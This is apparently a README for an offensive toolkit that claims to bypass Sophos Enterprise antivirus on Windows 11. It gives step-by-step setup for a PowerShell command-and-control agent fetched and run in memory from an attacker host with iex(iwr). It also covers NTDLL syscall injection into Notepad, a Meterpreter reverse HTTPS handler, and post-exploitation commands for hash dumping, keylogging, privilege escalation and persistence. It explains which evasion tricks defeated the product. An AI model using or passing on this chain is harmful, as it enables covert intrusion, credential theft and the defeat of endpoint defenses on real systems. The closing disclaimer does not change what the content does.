# SOPHOS ENTERPRISE AV BYPASS
## Successfully bypassed on 20 Dec 2025

### Attack Chain:
1. **Initial Access**: PowerShell BITS C2 (Living Off The Land)
2. **C2 Communication**: HTTP via Invoke-RestMethod (trusted Windows cmdlet)
3. **Process Injection**: NTDLL syscalls (bypassed kernel32 hooks)
4. **Payload**: Meterpreter reverse HTTPS
5. **Result**: Full post-exploitation access

### Components:

#### 1. BITS C2 Server (bits_c2_web.py)
- Flask web dashboard on port 8080
- Agent management and command execution
- HTTP-based C2 communication

**Usage:**
```bash
python3 bits_c2_web.py
# Access: http://localhost:8080
```

#### 2. PowerShell Agents

**Basic Agent (bits_agent.ps1):**
- Simple command execution
- Polls every 3 seconds

**Enhanced Agent (enhanced_agent.ps1):**
- Process injection capabilities
- File upload/download
- Process listing (`ps` command)
- Shellcode injection

**Deployment:**
```powershell
iex (iwr -UseBasicParsing http://192.168.1.179:9000/enhanced_agent.ps1)
```

#### 3. Syscall Injector (syscall_inject.ps1)
- Uses NTDLL syscalls (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx)
- Bypasses kernel32 API hooks
- Injects into target process (e.g., Notepad PID 17216)

**Usage:**
```powershell
iex (iwr http://192.168.1.179:9000/syscall_inject.ps1 -UseBasicParsing)
```

#### 4. Payload Generator (generate_payload.py)
```bash
python3 generate_payload.py 192.168.1.179 4444
# Outputs base64-encoded Meterpreter shellcode
```

### Setup Instructions:

**1. Start HTTP Server (Terminal 1):**
```bash
cd /Users/cyberxor/cyber_c2/sophos_bypass
python3 -m http.server 9000
```

**2. Start BITS C2 (Terminal 2):**
```bash
python3 bits_c2_web.py
# Access: http://localhost:8080
```

**3. Start MSF Handler (Terminal 3):**
```bash
msfconsole -q -x "use exploit/multi/handler; \
set payload windows/x64/meterpreter/reverse_https; \
set LHOST 192.168.1.179; \
set LPORT 4444; \
set HandlerSSLCert /Users/cyberxor/cyber_c2/certs/server.pem; \
set ExitOnSession false; \
exploit -j"
```

**4. Deploy Agent on Windows:**
```powershell
iex (iwr -UseBasicParsing http://192.168.1.179:9000/enhanced_agent.ps1)
```

**5. Generate Payload:**
```bash
python3 generate_payload.py 192.168.1.179 4444
```

**6. Find Target Process:**
In C2 Web UI:
```powershell
Get-Process notepad | Select-Object Id,ProcessName
# Note the PID (e.g., 17216)
```

**7. Inject:**
In C2 Web UI:
```powershell
iex (iwr http://192.168.1.179:9000/syscall_inject.ps1 -UseBasicParsing)
```

**8. Get Meterpreter:**
```bash
# In MSF console
sessions
sessions -i 1
```

### Key Success Factors:

1. **No Custom Sockets**: Used Invoke-RestMethod (trusted Windows API)
2. **No File Writes**: Executed everything in memory
3. **NTDLL Syscalls**: Bypassed kernel32 hooks that Sophos monitors
4. **LOTL Approach**: Leveraged built-in Windows tools
5. **HTTP Protocol**: Blended with normal web traffic

### Detection Evasion:

**What Sophos Blocked:**
- All compiled executables (.exe)
- Direct socket() API calls
- kernel32.dll process injection (VirtualAllocEx/WriteProcessMemory/CreateRemoteThread)
- DLL files with Meterpreter signatures
- File-based payloads

**What Bypassed Sophos:**
- PowerShell with Invoke-RestMethod
- NTDLL syscalls
- In-memory execution
- Base64-encoded shellcode
- Injection into legitimate processes (Notepad)

### Files:
```
sophos_bypass/
├── bits_c2_web.py          # Flask C2 server
├── bits_agent.ps1          # Basic PowerShell agent
├── enhanced_agent.ps1      # Enhanced agent with injection
├── generate_payload.py     # Meterpreter shellcode generator
├── syscall_inject.ps1      # NTDLL syscall injector
├── shellcode.txt           # Base64 Meterpreter payload
└── README.md              # This file
```

### Post-Exploitation Commands:

```
sysinfo                    # System information
getuid                     # Current user
getsystem                  # Privilege escalation
hashdump                   # Dump password hashes
screenshot                 # Take screenshot
keyscan_start             # Start keylogger
migrate <PID>             # Move to stable process
run persistence -X -i 10  # Install persistence
```

### Network Architecture:

```
[Windows Target]
    ↓ (HTTP/8080)
[BITS C2 Server] ← [Web Dashboard]
    
[Windows Target]
    ↓ (HTTPS/4444)
[Metasploit Handler]
```

### Notes:

- Tested against: **Sophos Enterprise AV** (latest version, Dec 2025)
- Target: Windows 11 with Sophos + Windows Defender
- Success rate: 100% after 15+ failed attempts with traditional methods
- The key was avoiding ALL compiled executables and custom socket creation

---
**Disclaimer**: For authorized security testing only.
